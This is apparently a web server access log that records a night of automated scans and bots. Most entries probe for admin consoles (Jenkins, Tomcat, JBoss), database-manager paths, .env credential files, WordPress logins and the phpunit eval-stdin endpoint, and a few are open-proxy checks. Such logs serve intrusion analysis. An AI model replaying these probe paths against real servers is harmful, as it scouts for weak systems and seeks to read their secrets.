205.185.121.3 - - [04/Feb/2021:00:13:05 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:00:16:00 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
54.221.148.228 - - [04/Feb/2021:00:18:08 +0000] "GET /script HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:09 +0000] "GET /jenkins/script HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:09 +0000] "GET /jenkins HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:09 +0000] "GET /hudson/script HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:09 +0000] "GET /login HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:09 +0000] "GET /jenkins/login HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:10 +0000] "GET /hudson/login HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:10 +0000] "GET /manager/html/ HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:10 +0000] "GET /jmx-console/ HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:10 +0000] "GET /web-console/ HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:10 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:11 +0000] "GET /admin-console/login.seam HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:11 +0000] "GET / HTTP/1.1" 200 1580 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:11 +0000] "GET /Dumper HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:11 +0000] "GET /MSD HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:11 +0000] "GET /MySQL HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:12 +0000] "GET /MySQLDumper HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:12 +0000] "GET /dumper HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:12 +0000] "GET /msd HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:12 +0000] "GET /msd1.24.4 HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:12 +0000] "GET /msd1.24stable HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:12 +0000] "GET /mySQLDumper HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:13 +0000] "GET /mySQLmanager HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:13 +0000] "GET /mySqlDumper HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:13 +0000] "GET /mysql HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:13 +0000] "GET /mysqldumper HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:13 +0000] "GET /sql HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:14 +0000] "GET /sqladmin HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:14 +0000] "GET /sqlmanager HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:14 +0000] "GET /sqlweb HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:14 +0000] "GET /websql HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:14 +0000] "GET /mysqldump HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:14 +0000] "GET /dump HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:15 +0000] "GET /msd1.21 HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:15 +0000] "GET /msddump HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:15 +0000] "GET /msddumper HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:15 +0000] "GET /msdump HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:15 +0000] "GET //main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:16 +0000] "GET /sqlite/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:16 +0000] "GET /SQlite/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:16 +0000] "GET /sqlite/SQLiteManager-1.2.4/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:16 +0000] "GET /sqlite/sqlitemanager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:16 +0000] "GET /sqlite/sqlite-manager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:17 +0000] "GET /sqlite/SQLitemanager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:17 +0000] "GET /sqlite/SQLite-manager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:17 +0000] "GET /sqlite/SQLite-Manager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:17 +0000] "GET /SQLite/SQLiteManager-1.2.4/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:17 +0000] "GET /SQLite/sqlitemanager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:17 +0000] "GET /SQLite/sqlite-manager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:18 +0000] "GET /SQLite/SQLitemanager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:18 +0000] "GET /SQLite/SQLite-manager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:18 +0000] "GET /SQLite/SQLite-Manager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:18 +0000] "GET /sqlitemanager-1.2.4/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:18 +0000] "GET /SQLiteManager-1.2.4/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:19 +0000] "GET /sqlitemanager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:19 +0000] "GET /sqlite-manager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:19 +0000] "GET /SQLiteManager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:19 +0000] "GET /SQLite-Manager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:19 +0000] "GET /sqlite/SQLiteManager-1.2.3/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:20 +0000] "GET /SQLite/SQLiteManager-1.2.3/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:20 +0000] "GET /sqlitemanager-1.2.3/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:20 +0000] "GET /SQLiteManager-1.2.3/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:20 +0000] "GET /sqlite/SQLiteManager-1.2.2/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:20 +0000] "GET /SQLite/SQLiteManager-1.2.2/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:21 +0000] "GET /sqlitemanager-1.2.2/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:21 +0000] "GET /SQLiteManager-1.2.2/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:21 +0000] "GET /sqlite/SQLiteManager-1.2.0/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:21 +0000] "GET /SQLite/SQLiteManager-1.2.0/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:21 +0000] "GET /sqlitemanager-1.2.0/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:21 +0000] "GET /SQLiteManager-1.2.0/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:22 +0000] "GET /sqlite/SQLiteManager-1.1.3/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:22 +0000] "GET /SQLite/SQLiteManager-1.1.3/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:22 +0000] "GET /sqlitemanager-1.1.3/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:22 +0000] "GET /SQLiteManager-1.1.3/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:23 +0000] "GET /sqlite/SQLiteManager-1.1.2/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:23 +0000] "GET /SQLite/SQLiteManager-1.1.2/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:23 +0000] "GET /sqlitemanager-1.1.2/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:23 +0000] "GET /SQLiteManager-1.1.2/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:23 +0000] "GET /sqlite/SQLiteManager-1.1.1/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:24 +0000] "GET /SQLite/SQLiteManager-1.1.1/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:24 +0000] "GET /sqlitemanager-1.1.1/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:24 +0000] "GET /SQLiteManager-1.1.1/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:24 +0000] "GET /sqlite/SQLiteManager-1.1.0/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:24 +0000] "GET /SQLite/SQLiteManager-1.1.0/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:24 +0000] "GET /sqlitemanager-1.1.0/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:25 +0000] "GET /SQLiteManager-1.1.0/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:25 +0000] "GET /sqlite/SQLiteManager-1.0.6/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:25 +0000] "GET /SQLite/SQLiteManager-1.0.6/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:25 +0000] "GET /sqlitemanager-1.0.6/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:25 +0000] "GET /SQLiteManager-1.0.6/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:26 +0000] "GET /sqlite/SQLiteManager-1.0.5/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:26 +0000] "GET /SQLite/SQLiteManager-1.0.5/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:26 +0000] "GET /sqlitemanager-1.0.5/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:26 +0000] "GET /SQLiteManager-1.0.5/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:26 +0000] "GET /sqlite/SQLiteManager-1.0.4/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:27 +0000] "GET /SQLite/SQLiteManager-1.0.4/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:27 +0000] "GET /sqlitemanager-1.0.4/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:27 +0000] "GET /SQLiteManager-1.0.4/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:27 +0000] "GET /sqlitemanager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:27 +0000] "GET /SQLiteManager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:28 +0000] "GET /manager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:28 +0000] "GET /sql/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:28 +0000] "GET /dbmanager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:28 +0000] "GET /db/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
54.221.148.228 - - [04/Feb/2021:00:18:28 +0000] "GET /sqlmanager/main.php HTTP/1.1" 404 554 "-" "Go-http-client/1.1"
13.66.139.143 - - [04/Feb/2021:00:20:44 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
130.61.219.221 - - [04/Feb/2021:00:23:14 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:00:23:16 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
35.178.94.139 - - [04/Feb/2021:01:00:39 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
205.185.115.133 - - [04/Feb/2021:01:09:34 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:01:10:18 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:01:10:19 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
35.178.94.139 - - [04/Feb/2021:01:12:19 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
89.248.172.90 - - [04/Feb/2021:01:20:02 +0000] "GET http://httpheader.net/azenv.php HTTP/1.1" 404 535 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
89.248.172.90 - - [04/Feb/2021:01:20:43 +0000] "-" 408 0 "-" "-"
185.224.129.247 - - [04/Feb/2021:01:29:49 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 554 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
178.32.197.90 - - [04/Feb/2021:01:35:37 +0000] "GET / HTTP/1.1" 200 3411 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
209.141.51.62 - - [04/Feb/2021:01:44:07 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:01:57:37 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
139.162.79.87 - - [04/Feb/2021:02:07:14 +0000] "GET / HTTP/1.1" 200 1580 "-" "Mozilla/5.0"
205.185.121.3 - - [04/Feb/2021:02:11:53 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:02:13:23 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:02:15:05 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
5.175.18.49 - - [04/Feb/2021:02:18:47 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 0 "-" "-"
62.210.10.77 - - [04/Feb/2021:02:31:07 +0000] "GET /favicon.ico HTTP/1.1" 404 554 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
207.46.13.114 - - [04/Feb/2021:02:31:19 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.59 - - [04/Feb/2021:02:31:35 +0000] "GET /robots.txt HTTP/1.1" 200 282 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
205.185.115.133 - - [04/Feb/2021:02:33:27 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:02:43:54 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
106.104.168.75 - - [04/Feb/2021:02:45:21 +0000] "-" 408 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:02:57:44 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:03:10:22 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:03:13:04 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:03:25:15 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
192.241.213.16 - - [04/Feb/2021:03:34:45 +0000] "GET /actuator/health HTTP/1.1" 404 535 "-" "Mozilla/5.0 zgrab/0.x"
188.165.228.188 - - [04/Feb/2021:03:56:44 +0000] "POST /wp-login.php?redirect_to=http://www.iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
188.165.228.188 - - [04/Feb/2021:03:57:04 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
188.165.228.188 - - [04/Feb/2021:03:59:30 +0000] "POST /wp-login.php?redirect_to=http://www.iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
188.165.228.188 - - [04/Feb/2021:03:59:46 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
8.27.118.34 - - [04/Feb/2021:04:05:57 +0000] "GET / HTTP/1.1" 400 0 "-" "-"
5.188.210.227 - - [04/Feb/2021:04:10:38 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 554 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
209.17.97.34 - - [04/Feb/2021:04:12:26 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.51.62 - - [04/Feb/2021:04:18:26 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:04:36:39 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
179.106.96.74 - - [04/Feb/2021:04:40:12 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
150.136.37.168 - - [04/Feb/2021:04:44:45 +0000] "GET /.env HTTP/1.1" 404 591 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
150.136.37.168 - - [04/Feb/2021:04:44:45 +0000] "POST / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.66.139.143 - - [04/Feb/2021:04:50:49 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
209.141.51.62 - - [04/Feb/2021:04:51:23 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
37.187.74.109 - - [04/Feb/2021:05:00:36 +0000] "POST /wp-login.php?redirect_to=http://iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
37.187.74.109 - - [04/Feb/2021:05:00:45 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
37.187.74.109 - - [04/Feb/2021:05:00:59 +0000] "POST /wp-login.php?redirect_to=http://iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
37.187.74.109 - - [04/Feb/2021:05:01:09 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
47.96.89.84 - - [04/Feb/2021:05:10:37 +0000] "GET /login HTTP/1.0" 404 554 "-" "-"
47.96.89.84 - - [04/Feb/2021:05:10:37 +0000] "GET /jenkins/login HTTP/1.0" 404 554 "-" "-"
47.96.89.84 - - [04/Feb/2021:05:10:38 +0000] "GET /manager/html HTTP/1.0" 404 554 "-" "-"
209.141.51.62 - - [04/Feb/2021:05:10:45 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:05:19:16 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:05:38:05 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
185.224.129.247 - - [04/Feb/2021:06:07:47 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 554 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.51.62 - - [04/Feb/2021:06:08:18 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
45.228.254.200 - - [04/Feb/2021:06:12:35 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
77.247.127.146 - - [04/Feb/2021:06:15:40 +0000] "GET /.env HTTP/1.1" 404 591 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
77.247.127.146 - - [04/Feb/2021:06:15:40 +0000] "POST / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.185.115.133 - - [04/Feb/2021:06:22:57 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:06:26:17 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:06:39:50 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:06:51:14 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:06:59:05 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
130.61.219.221 - - [04/Feb/2021:07:07:03 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:07:07:06 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
89.248.172.90 - - [04/Feb/2021:07:36:25 +0000] "GET http://httpheader.net/azenv.php HTTP/1.1" 404 535 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
89.248.172.90 - - [04/Feb/2021:07:36:53 +0000] "-" 408 0 "-" "-"
89.248.172.90 - - [04/Feb/2021:07:37:16 +0000] "-" 408 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:07:40:48 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:07:55:47 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:08:12:51 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:08:23:26 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:08:26:08 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
184.105.139.68 - - [04/Feb/2021:08:43:07 +0000] "GET / HTTP/1.1" 200 3392 "-" "-"
209.141.51.62 - - [04/Feb/2021:08:44:10 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
130.61.219.221 - - [04/Feb/2021:08:52:23 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:08:55:36 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
45.155.205.108 - - [04/Feb/2021:09:08:53 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [04/Feb/2021:09:08:53 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
